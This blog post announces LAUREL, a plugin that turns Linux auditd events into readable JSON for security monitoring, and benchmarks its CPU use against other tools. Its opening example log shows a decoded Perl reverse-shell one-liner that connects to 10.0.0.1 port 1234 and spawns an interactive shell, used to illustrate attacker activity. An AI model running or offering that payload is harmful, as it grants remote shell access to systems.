---
date: 2021-12-25
draft: false
title: "LAUREL: Linux Audit – Usable, Robust, Easy Logging"
categories: [posts]
tags: [post, blog]

---
LAUREL is an event post-processing plugin for _auditd(8)_ to improve its usability in modern security monitoring setups.
### Why?
Instead of audit events that look like this…
```
type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B65742…
```
…turn them into JSON logs where the mess that your pen testers/red teamers/attackers are trying to make becomes apparent at first glance:

```json
{
    [...]
    "EXECVE": {
        "argc": 3,
        "ARGV": [
            "perl",
            "-e",
            "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"
        ]
    },
    [...]
}
```

This happens at the source. The generated event even contains useful information about the spawning process:

```
"PARENT_INFO":{"ARGV":["bash"],"launch_time":1626611323.973,"ppid":3190631}
```

### Description

Logs produced by the Linux Audit subsystem and _auditd(8)_ contain information that can be very useful in a SIEM context (if a useful rule set has been configured). However, the format is not well-suited for at-scale analysis: Events are usually split across different lines that have to be merged using a message identifier. Files and program executions are logged via `PATH` and `EXECVE` elements, but a limited character set for strings causes many of those entries to be hex-encoded. For a more detailed discussion, see [Practical_auditd_problems]("https://github.com/threathunters-io/laurel/blob/master/practical-auditd-problems.md").

_LAUREL_ solves these problems by consuming audit events, parsing and transforming them into more data and writing them out as a JSON-based log format, while keeping all information intact that was part of the original audit log. It does not replace auditd as the consumer of audit messages from the kernel. Instead, it uses the audisp ("audit dispatch") interface to receive messages via _auditd(8)_. Therefore, it can peacefully coexist with other consumers of audit events (e.g. some EDR products).

Refer to [JSON-based log format]("https://github.com/threathunters-io/laurel/blob/master/json-format.md" target="_blank") for a description of the log format. We developed this tool because we were not content with feature sets and performance characteristics of existing projects and products. Please refer to ![Performance]("https://github.com/threathunters-io/laurel/blob/master/performance.svg" "Figure 1: Performance") for details.

### LAUREL Performance
While LAUREL was written with performance in mind, running it on busy systems with audit rule sets that actually produce log entries does incur some CPU overhead.

We have conducted benchmarks of LAUREL against auditd and several other tools. A load generator that spawns trivial processes (/bin/true) at a set frequency was used to generate load and CPU time (system+user) for all processes involved was measured. The number of exec events per second was chosen due to our experience with systems where hundreds of processes are spawned during regular operation. A custom tool, edr-loadgen, was written for this task.

As can be seen in the graph CPU consumption by auditd(8), its event dispatcher, and LAUREL combined is about twice as high as with a plain _auditd(8)_ setup using the log_format=ENRICHED configuration option. We still see several oppurtunities for improvements.

All measurements involving the Linux audit framework were conducted on an AWS EC2 t2.small instance running Amazon Linunx 2. Since Sysmon for Linux does not (yet?) support that distribution's kernel version, it was tested on Ubuntu 20.04.

### Notes

CPU usage for all user-space processes that are involved in collecting and emitting events was measured. In LAUREL's case, this included auditd and audispd. Sysmon for Linux writes its events through systemd-journald(8), so its CPU usage also had to be taken into account. Both go-audit and auditbeat are replacements for auditd that directly consume events from the kernel, so CPU usage had to be recorded only for one process. The numbers for Sysmon for Linux should be taken with a grain of salt since the experiments conducted so far only took CPU usage into account that was directly attributed to user-space processes. We are open to suggestions on how to compare the kernel/user interface for the Linux audit framework to the eBPF probes used by Sysmon. The log file produced by go-audit is JSONL-based which might lead to the conclusion that replacing auditd with go-audit might be a good choice. However go-audit solves only one of the log format quirks described in Practical auditd(8) problems and does not even perform all of the translations that auditd does when configured with log_format=ENRICHED.

GIT repository [here]("https://github.com/threathunters-io/laurel") 